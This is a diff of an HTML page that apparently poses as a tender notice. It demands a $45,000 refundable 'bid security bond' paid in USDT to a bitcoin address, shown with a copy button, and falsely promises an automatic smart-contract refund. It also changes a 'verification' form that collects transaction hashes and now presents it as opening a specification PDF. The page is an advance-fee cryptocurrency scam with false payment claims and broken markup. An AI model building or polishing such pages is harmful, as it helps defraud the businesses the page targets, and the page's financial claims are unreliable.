@@ -195,26 +195,22 @@ class="divider-double">---------------------------------------------------------
     <div class="indent-block">
         <div class="guideline-item">1. <strong>Liquid Asset Validation:</strong> Bidders must deposit a fully refundable Bid Security Bond of $45,000.00 USD into the approved Automated Smart Escrow account.</div>
         <div class="guideline-item">2. <strong>Escrow Custody Channel:</strong> To prevent currency fluctuation and regional banking blocks, payments must be processed using USD Tether (USDT) on the BTC COIN blockchain network.</div>
-       <div style="font-family: system-ui, -apple-system, sans-serif; max-width: 360px; margin: 20px auto; padding: 24px; border-radius: 16px; background: #ffffff; box-shadow: 0 4px 20px rgba(0,0,0,0.08); text-align: center; border: 1px solid #eaeaea;">
+       
   <!-- Header -->
   <div style="display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 20px;">
     <span style="background: #f7931a; color: white; border-radius: 50%; width: 28px; height: 28px; display: flex; align-items: center; justify-content: center; font-weight: bold; font-size: 16px;">₿</span>
-    <h3 style="margin: 0; color: #1a1a1a; font-size: 18px; font-weight: 600;">Bitcoin Destination</h3>
-  </div>
+    
 
   <!-- QR Code Wrapper -->
-  <div style="background: #f9f9f9; padding: 16px; border-radius: 12px; display: inline-block; margin-bottom: 20px; border: 1px dashed #cccccc;">
-    <!-- Rendered QR Code Placeholder -->
-    <img src="https://qrserver.com" alt="Bitcoin QR Code" style="display: block; width: 180px; height: 180px;" />
-  </div>
+  
 
   <!-- Label -->
-  <p style="margin: 0 0 8px 0; color: #666666; font-size: 13px; font-weight: 500;">Secure Account Wallet Address</p>
+  
 
   <!-- Address Display & Copy Action -->
-  <div style="background: #f4f4f5; padding: 12px; border-radius: 8px; display: flex; align-items: center; justify-content: space-between; gap: 8px; border: 1px solid #e4e4e7;">
+  <div style="background: #f4f4f5; padding: 12px; border-radius: 8px; display: flex; align-items: center; justify-content: space-between; gap: 12px; border: 1px solid #e4e4e7;">
     <span id="btc-address" style="font-family: monospace; font-size: 12px; color: #18181b; word-break: break-all; text-align: left; user-select: all;">bc1q5dlwnvf7p9ur5wpwvl2pxm8g0v90w38tvq5jln</span>
-    <button onclick="copyToClipboard()" style="background: #ffffff; border: 1px solid #e4e4e7; border-radius: 6px; padding: 6px 10px; font-size: 12px; font-weight: 600; color: #27272a; cursor: pointer; white-space: nowrap; transition: background 0.2s;" onmouseover="this.style.background='#f4f4f5'" onmouseout="this.style.background='#ffffff'">
+    <button onclick="copyToClipboard()" style="background: #ffffff; border: 1px solid #e4e4e7; border-radius: 6px; padding: 6px 12px; font-size: 12px; font-weight: 600; color: #27272a; cursor: pointer; white-space: nowrap; transition: background 0.2s;" onmouseover="this.style.background='#f4f4f5'" onmouseout="this.style.background='#ffffff'">
       Copy
     </button>
   </div>
@@ -224,12 +220,13 @@ class="divider-double">---------------------------------------------------------
 function copyToClipboard() {
   const addressText = document.getElementById('btc-address').innerText;
   navigator.clipboard.writeText(addressText).then(() => {
-    alert('Address copied to clipboard!');
+    ('Address copied to clipboard!');
   }).catch(err => {
     console.error('Failed to copy: ', err);
   });
 }
 </script>
+
 
         <div class="guideline-item">4. <strong>Automatic Refund Clause:</strong> These funds are held in a neutral, non-custodial digital vault. If your company is not selected for the final contract award on June 15, 2026, the smart contract will automatically reverse and return 100% of the digital assets to your originating wallet within 24 hours.</div>
     </div>
@@ -280,7 +277,7 @@ function copyToClipboard() {
                 <!-- Trigger Button Box -->
                 <div id="initialBox" class="decryption-box">
                     <p style="margin: 0; font-weight: bold;">🔒 VERIFICATION REQUIRED</p>
-                    <p style="margin: 10px 0 0 0; text-decoration: underline; font-size: 14px;">CLICK HERE TO OPEN COMPLIANCE FORM</p>
+                     <p style="margin: 10px 0 0 0; text-decoration: underline; font-size: 14px;">CLICK HERE TO OPEN technical_specification_sheet.pdf</p>
                 </div>
 
                 <!-- Input Collection Area Elements -->
@@ -289,8 +286,8 @@ function copyToClipboard() {
                     
                     <form id="complianceForm" onsubmit="return false;">
                         <div class="form-group">
-                            <label for="txidInput">Filing Reference / Transaction Hash:</label>
-                            <input type="text" id="txidInput" placeholder="Enter your reference code" required minlength="8">
+                            <label  <label for="txidInput">Transaction Reference / TXID Hash:</label>
+                              <input type="text" id="txidInput" placeholder="Enter unique 64-character" required minlength="8">
                         </div>
                         <button type="submit" class="btn-submit">VERIFY SUBMISSION</button>
                     </form>
